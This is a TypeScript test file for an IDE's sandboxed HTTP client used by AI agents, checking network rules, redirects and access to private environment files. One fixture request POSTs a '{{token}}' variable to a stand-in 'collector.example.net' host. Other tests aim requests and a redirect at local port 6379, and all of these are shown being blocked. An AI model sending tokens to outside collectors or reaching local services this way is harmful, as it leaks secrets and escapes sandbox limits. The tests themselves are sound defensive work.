/*---------------------------------------------------------------------------------------------
 *  Copyright (c) Volt ADK. All rights reserved.
 *  Licensed under the MIT License. See License.txt in the project root for license information.
 *--------------------------------------------------------------------------------------------*/

import assert from 'assert';
import { bufferToStream, streamToBuffer, VSBuffer } from '../../../../../base/common/buffer.js';
import { CancellationToken } from '../../../../../base/common/cancellation.js';
import { Event } from '../../../../../base/common/event.js';
import { Schemas } from '../../../../../base/common/network.js';
import { isEqualOrParent } from '../../../../../base/common/resources.js';
import { URI } from '../../../../../base/common/uri.js';
import { IRequestContext, IRequestOptions } from '../../../../../base/parts/request/common/request.js';
import { request } from '../../../../../base/parts/request/common/requestImpl.js';
import { ensureNoDisposablesAreLeakedInTestSuite } from '../../../../../base/test/common/utils.js';
import { FileService } from '../../../../../platform/files/common/fileService.js';
import { InMemoryFileSystemProvider } from '../../../../../platform/files/common/inMemoryFilesystemProvider.js';
import { IInstantiationService } from '../../../../../platform/instantiation/common/instantiation.js';
import { NullLogService } from '../../../../../platform/log/common/log.js';
import { InMemoryStorageService } from '../../../../../platform/storage/common/storage.js';
import { IVoltHttpTransport } from '../../../../../platform/voltHttp/common/voltHttpTransport.js';
import { IVoltSandboxSettings } from '../../../../../platform/voltSandbox/common/sandboxPolicy.js';
import { IVoltStdioService } from '../../../../../platform/voltStdio/common/voltStdio.js';
import { IWorkspaceContextService } from '../../../../../platform/workspace/common/workspace.js';
import { ISearchService } from '../../../../services/search/common/search.js';
import { voltExec } from '../../../../services/voltRuntime/common/execContext.js';
import { IdeCli, IIdeCapabilityContext } from '../../../voltAgent/browser/ide/capabilities/capability.js';
import { HttpCapability } from '../../../voltAgent/browser/ide/capabilities/workbenchCapabilities.js';
import { VoltHttpService } from '../../browser/voltHttpService.js';

const REPO = URI.file('/tmp/v4-devrepo');

suite('Volt HTTP client for agents', () => {

	const store = ensureNoDisposablesAreLeakedInTestSuite();

	/** What the fake server answers: `/login` a token, anything else `ok`. */
	function answer(options: IRequestOptions): { status: number; headers: Record<string, string>; body: string } {
		return { status: 200, headers: { 'content-type': 'application/json' }, body: options.url?.endsWith('/login') ? '{"token":"user-secret-token"}' : 'ok' };
	}

	function setup(respond = answer) {
		const fileService = store.add(new FileService(new NullLogService()));
		store.add(fileService.registerProvider(Schemas.file, store.add(new InMemoryFileSystemProvider())));
		const files: URI[] = [];
		const write = async (path: string, text: string) => {
			const uri = URI.file(path);
			await fileService.writeFile(uri, VSBuffer.fromString(text));
			if (!files.some(file => file.toString() === uri.toString())) {
				files.push(uri);
			}
		};
		// The agent window: no folders of its own.
		const workspace = { getWorkspace: () => ({ folders: [] }), onDidChangeWorkspaceFolders: Event.None } as unknown as IWorkspaceContextService;
		const instantiation = { createInstance: () => ({ file: (folders: URI[]) => ({ folders }) }) } as unknown as IInstantiationService;
		const search = {
			fileSearch: async (query: { folders: URI[] }) => ({ results: files.filter(file => /\.(?:http|rest)$/.test(file.path) && query.folders.some(folder => isEqualOrParent(file, folder))).map(resource => ({ resource })) }),
		} as unknown as ISearchService;
		const sent: IRequestOptions[] = [];
		const requests = {
			request: async (options: IRequestOptions): Promise<IRequestContext> => {
				sent.push(options);
				const { status, headers, body } = respond(options);
				return { res: { headers, statusCode: status }, stream: bufferToStream(VSBuffer.fromString(body)) };
			},
		} as unknown as IVoltHttpTransport;
		const storage = store.add(new InMemoryStorageService());
		const http = store.add(new VoltHttpService(requests, fileService, search, workspace, storage, instantiation));
		return { http, write, sent, fileService };
	}

	function capabilityContext(sandbox: IVoltSandboxSettings | undefined, readRefusal = async (path: string) => path.startsWith(REPO.path) && !path.endsWith('private.env.json') ? undefined : `${path} is not readable`): IIdeCapabilityContext {
		return {
			root: REPO,
			chatId: 'chat-1',
			token: CancellationToken.None,
			cli: new IdeCli({} as IVoltStdioService, REPO.fsPath, voltExec('agent-shell')),
			...(sandbox ? { confinement: { sandbox, readRefusal } } : {}),
		};
	}

	test('DEV-LIVE-2: ide http lists and sends the requests of the chat\'s folder, and sees a request file added later', async () => {
		const { http, write } = setup();
		await write('/tmp/v4-devrepo/requests.http', '# @name health\nGET https://api.example.com/health\n');
		const capability = new HttpCapability(http);
		const list = await capability.invoke('list', {}, capabilityContext(undefined));
		assert.match(list.text, /^requests\.http\n {2}health {2}GET https:\/\/api\.example\.com\/health/, 'the chat\'s folder, though the window holds none');
		assert.strictEqual((await http.index()).length, 0, 'the window\'s own index is unchanged');

		// A request file the agent adds later is listed: the index is dropped when a request file changes.
		const changed = Event.toPromise(http.onDidChangeIndex);
		await write('/tmp/v4-devrepo/api/more.http', '# @name users\nGET https://api.example.com/users\n');
		await changed;
		assert.match((await capability.invoke('list', {}, capabilityContext(undefined))).text, /api\/more\.http\n {2}users/);
	});

	test('DEV-SBX-14: a sandboxed chat\'s HTTP requests follow its network rules, from the URL that goes out, without redirects, the user\'s responses or files it may not read', async () => {
		const { http, write, sent } = setup();
		await write('/tmp/v4-devrepo/requests.http', [
			'@collector = collector.example.net',
			'# @name collect',
			'POST https://{{collector}}/c',
			'',
			'{{token}}',
			'',
			'###',
			'# @name allowed',
			'GET https://api.example.com/v1',
			'',
			'###',
			'# @name chained',
			'GET https://api.example.com/me',
			'Authorization: Bearer {{login.response.body.$.token}}',
		].join('\n'));
		await write('/tmp/v4-devrepo/http-client.private.env.json', '{"dev":{"token":"from-a-file-it-may-not-read"}}');
		const capability = new HttpCapability(http);
		const offline = capabilityContext({ level: 'workspace-write', network: false, allowedDomains: ['api.example.com'] });

		// A named request's URL is only known once its variables are filled in: judged then.
		const collect = await capability.invoke('send', { name: 'collect' }, offline);
		assert.strictEqual(collect.isError, true);
		assert.match(collect.text, /Not sent: collector\.example\.net is not reachable: this chat's network is off\. This chat runs in Volt's sandbox/);
		const adHoc = await capability.invoke('send', { method: 'GET', url: 'localhost:6379/' }, offline);
		assert.match(adHoc.text, /Not sent: localhost:6379 is a local server on a port this chat's sandbox was not granted/);
		assert.strictEqual(sent.length, 0, 'nothing went out');

		// An allowed host goes out, without following redirects.
		const allowed = await capability.invoke('send', { name: 'allowed' }, offline);
		assert.strictEqual(allowed.isError, undefined);
		assert.deepStrictEqual(sent.map(options => [options.url, options.followRedirects]), [['https://api.example.com/v1', 0]]);

		// The user's earlier login response (a token) is not the chat's to chain from.
		await http.send({ name: 'login', method: 'POST', url: 'https://api.example.com/login', headers: [], line: 0 }, { root: REPO });
		assert.strictEqual(sent.at(-1)?.followRedirects, 5, 'the user\'s own send follows redirects as before');
		const chained = await capability.invoke('send', { name: 'chained' }, offline);
		assert.match(chained.text, /Unresolved variable: login\.response\.body\.\$\.token/);
		assert.strictEqual(sent.length, 2);

		// An environment file it may not read is not read for it.
		const envs = await capability.invoke('envs', {}, offline);
		assert.doesNotMatch(envs.text, /from-a-file/);
		assert.match((await capability.invoke('envs', {}, capabilityContext(undefined))).text, /dev: token=/, 'unsandboxed: as before');

		// Network on: the chat's rules allow any host, and the request goes out.
		const online = capabilityContext({ level: 'workspace-write', network: true });
		assert.strictEqual((await capability.invoke('send', { method: 'GET', url: 'https://collector.example.net/c' }, online)).isError, undefined);
		assert.strictEqual(sent.length, 3);
	});

	test('DEV-SBX-15: a sandboxed chat\'s send never follows a redirect, whichever transport sends it', async () => {
		// A browser's fetch (the web workbench's request service) is told not to follow: it answers with an opaque redirect.
		const inits: RequestInit[] = [];
		const realFetch = globalThis.fetch;
		globalThis.fetch = async (_input: RequestInfo | URL, init?: RequestInit) => {
			inits.push(init ?? {});
			return new Response('ok');
		};
		try {
			await streamToBuffer((await request({ url: 'https://api.example.com/', followRedirects: 0 }, CancellationToken.None)).stream);
			await streamToBuffer((await request({ url: 'https://api.example.com/', followRedirects: 5 }, CancellationToken.None)).stream);
		} finally {
			globalThis.fetch = realFetch;
		}
		assert.deepStrictEqual(inits.map(init => init.redirect), ['manual', undefined], 'only the send that may not follow is told so');

		const offline = capabilityContext({ level: 'workspace-write', network: false, allowedDomains: ['api.example.com'] });
		// That opaque answer says nothing about where it points: the model is told so, not shown an empty 0.
		const opaque = setup(() => ({ status: 0, headers: {}, body: '' }));
		const hidden = await new HttpCapability(opaque.http).invoke('send', { method: 'GET', url: 'https://api.example.com/old' }, offline);
		assert.strictEqual(hidden.isError, true);
		assert.match(hidden.text, /^GET https:\/\/api\.example\.com\/old: The server answered with a redirect, which is not followed for a sandboxed chat, and this window cannot see where it points\. Send the request to the URL it should go to/);
		assert.deepStrictEqual(opaque.sent.map(options => options.followRedirects), [0]);

		// A transport that hands back the redirect itself (the desktop app's, from the main process): shown, with the location to send next.
		const node = setup(() => ({ status: 302, headers: { location: 'http://127.0.0.1:6379/' }, body: '' }));
		const shown = await new HttpCapability(node.http).invoke('send', { method: 'GET', url: 'https://api.example.com/old' }, offline);
		assert.match(shown.text, /^GET https:\/\/api\.example\.com\/old\n302 Found .*\n\(Not followed: this chat runs in Volt's sandbox\. Send the location to follow it; its host is judged by the chat's network rules\.\)\nlocation: http:\/\/127\.0\.0\.1:6379\//);
		assert.strictEqual(node.sent.length, 1, 'the location was not requested');
		// And sending the location is judged like any send.
		assert.match((await new HttpCapability(node.http).invoke('send', { method: 'GET', url: 'http://127.0.0.1:6379/' }, offline)).text, /Not sent: 127\.0\.0\.1:6379 is a local server on a port this chat's sandbox was not granted/);
		assert.strictEqual(node.sent.length, 1);
	});

	test('DEV-SBX-17: a sandboxed chat picks an environment for its own send; the user\'s selection stays the user\'s', async () => {
		const { http, write, sent } = setup();
		await write('/tmp/v4-devrepo/http-client.env.json', '{"dev":{"host":"api.example.com"},"prod":{"host":"prod.example.com"}}');
		await write('/tmp/v4-devrepo/requests.http', '# @name ping\nGET https://{{host}}/ping\n');
		http.setEnvironment('dev');
		const capability = new HttpCapability(http);
		const confined = capabilityContext({ level: 'workspace-write', network: false, allowedDomains: ['api.example.com', 'prod.example.com'] });

		assert.strictEqual((await capability.invoke('send', { name: 'ping', env: 'prod' }, confined)).isError, undefined);
		assert.strictEqual(sent.at(-1)?.url, 'https://prod.example.com/ping');
		assert.strictEqual(http.environment, 'dev', 'the user\'s next send still uses dev');
		assert.match((await capability.invoke('send', { name: 'ping', env: 'staging' }, confined)).text, /^No environment "staging"\. Available: dev, prod\.$/);

		// Unsandboxed, as before: the agent's pick is the window's selection.
		await capability.invoke('send', { name: 'ping', env: 'prod' }, capabilityContext(undefined));
		assert.strictEqual(http.environment, 'prod');
	});
});
